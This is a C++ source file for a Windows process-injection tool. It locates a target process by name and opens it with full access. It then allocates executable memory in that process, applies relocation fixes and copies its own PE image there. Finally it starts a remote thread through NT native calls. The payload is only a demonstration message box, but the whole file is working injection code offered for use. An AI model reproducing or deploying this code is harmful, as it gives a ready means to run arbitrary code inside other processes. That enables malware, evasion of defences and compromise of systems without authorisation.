#include <windows.h>
#include <psapi.h>
#include <iostream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

typedef struct _USTR {
    USHORT Len;
    USHORT MaxLen;
    PWCHAR Buf;
} USTR, *PUSTR;

typedef struct _OBJATTR {
    ULONG Len;
    HANDLE RootDir;
    PUSTR ObjName;
    ULONG Attr;
    PVOID SecDesc;
    PVOID SecQual;
} OBJATTR, *POBJATTR;

typedef struct _CL_ID {
    HANDLE Pid;
    HANDLE Tid;
} CL_ID, *PCL_ID;

typedef LONG NTST;
#define IS_SUCCESS(Status) (((NTST)(Status)) >= 0)

extern "C" {
    NTST NtOpenProcess(
        PHANDLE hProc,
        ACCESS_MASK access,
        POBJATTR objAttr,
        PCL_ID clId
    );
    NTST NtAllocateVirtualMemory(
        HANDLE hProc,
        PVOID* baseAddr,
        ULONG_PTR zeroBits,
        PSIZE_T regSize,
        ULONG allocType,
        ULONG protect
    );
    NTST NtWriteVirtualMemory(
        HANDLE hProc,
        PVOID baseAddr,
        PVOID buf,
        SIZE_T bytesToWrite,
        PSIZE_T writtenBytes
    );
    NTST NtCreateThreadEx(
        PHANDLE hThread,
        ACCESS_MASK access,
        PVOID objAttr,
        HANDLE hProc,
        PVOID startRoutine,
        PVOID arg,
        ULONG flags,
        ULONG_PTR zeroBits,
        SIZE_T stackSize,
        SIZE_T maxStackSize,
        PVOID attrList
    );
}

void errMsg(const char* fn, NTST status) {
    std::cout << "[-] " << fn << " fail, code: 0x" << std::hex << status << std::endl;
}

HANDLE openProc(DWORD pid) {
    CL_ID clId;
    clId.Pid = reinterpret_cast<HANDLE>(pid);
    clId.Tid = nullptr;
    OBJATTR objAttr;
    objAttr.Len = sizeof(OBJATTR);
    objAttr.RootDir = nullptr;
    objAttr.ObjName = nullptr;
    objAttr.Attr = 0;
    objAttr.SecDesc = nullptr;
    objAttr.SecQual = nullptr;
    HANDLE hProc = nullptr;
    NTST status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &clId);
    if (!IS_SUCCESS(status)) {
        errMsg("NtOpenProcess", status);
        return nullptr;
    }
    return hProc;
}

struct REL_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
};

typedef REL_ENTRY* PREL_ENTRY;

void injectMsg() {
    MessageBoxA(nullptr, "Injected Pe!", "Injected", MB_OK | MB_ICONEXCLAMATION);
}

class PeHdrs {
public:
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    IMAGE_OPTIONAL_HEADER optHdr;
    IMAGE_FILE_HEADER fileHdr;
    PeHdrs(PVOID imgBase) {
        dosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(imgBase);
        ntHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(imgBase) + dosHdr->e_lfanew);
        optHdr = ntHdrs->OptionalHeader;
        fileHdr = ntHdrs->FileHeader;
    }
};

DWORD getPid(const char* procName) {
    DWORD pids[1024], needed;
    if (!EnumProcesses(pids, sizeof(pids), &needed)) return 0;
    SIZE_T count = needed / sizeof(DWORD);
    for (SIZE_T i = 0; i < count; i++) {
        DWORD pid = pids[i];
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProc) {
            HMODULE hMod;
            DWORD cbNeeded;
            char name[MAX_PATH] = { 0 };
            if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseNameA(hProc, hMod, name, sizeof(name));
                if (!_stricmp(name, procName)) {
                    CloseHandle(hProc);
                    return pid;
                }
            }
            CloseHandle(hProc);
        }
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc <= 1) {
        std::cout << "[*] Usage: inject.exe <PROC_NAME>" << std::endl;
        return 1;
    }
    DWORD pid = getPid(argv[1]);
    if (!pid) {
        std::cout << "[-] Can't find proc." << std::endl;
        return 1;
    }
    HANDLE hProc = openProc(pid);
    if (!hProc) {
        std::cout << "[-] Can't open proc." << std::endl;
        return 1;
    }
    PVOID imgBase = GetModuleHandleA(nullptr);
    PeHdrs imgHdrs(imgBase);
    PVOID localImg = nullptr;
    SIZE_T localImgSize = imgHdrs.optHdr.SizeOfImage;
    NTST status = NtAllocateVirtualMemory(GetCurrentProcess(), &localImg, 0, &localImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!IS_SUCCESS(status)) {
        errMsg("NtAllocateVirtualMemory", status);
        return 1;
    }
    memcpy(localImg, imgBase, imgHdrs.optHdr.SizeOfImage);
    PVOID targetImg = nullptr;
    status = NtAllocateVirtualMemory(hProc, &targetImg, 0, &localImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!IS_SUCCESS(status)) {
        errMsg("NtAllocateVirtualMemory", status);
        return 1;
    }
    DWORD_PTR deltaBase = reinterpret_cast<DWORD_PTR>(targetImg) - reinterpret_cast<DWORD_PTR>(imgBase);
    PIMAGE_BASE_RELOCATION relTable = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<DWORD_PTR>(localImg) + imgHdrs.optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    std::cout << "[+] Fixing reloc" << std::endl;
    while (relTable->SizeOfBlock > 0) {
        DWORD relCount = (relTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PREL_ENTRY relRVA = reinterpret_cast<PREL_ENTRY>(relTable + 1);
        for (DWORD i = 0; i < relCount; i++) {
            if (relRVA[i].Offset) {
                PDWORD_PTR fixAddr = reinterpret_cast<PDWORD_PTR>(reinterpret_cast<DWORD_PTR>(localImg) + relTable->VirtualAddress + relRVA[i].Offset);
                *fixAddr += deltaBase;
            }
        }
        relTable = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<DWORD_PTR>(relTable) + relTable->SizeOfBlock);
    }
    status = NtWriteVirtualMemory(hProc, targetImg, localImg, imgHdrs.optHdr.SizeOfImage, nullptr);
    if (!IS_SUCCESS(status)) {
        errMsg("NtWriteVirtualMemory", status);
        return 1;
    }
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProc, reinterpret_cast<PVOID>(reinterpret_cast<DWORD_PTR>(&injectMsg) + deltaBase), nullptr, 0, 0, 0, 0, nullptr);
    if (!IS_SUCCESS(status)) {
        errMsg("NtCreateThreadEx", status);
        return 1;
    }
    std::cout << "[+] Done!" << std::endl;
    return 0;
}
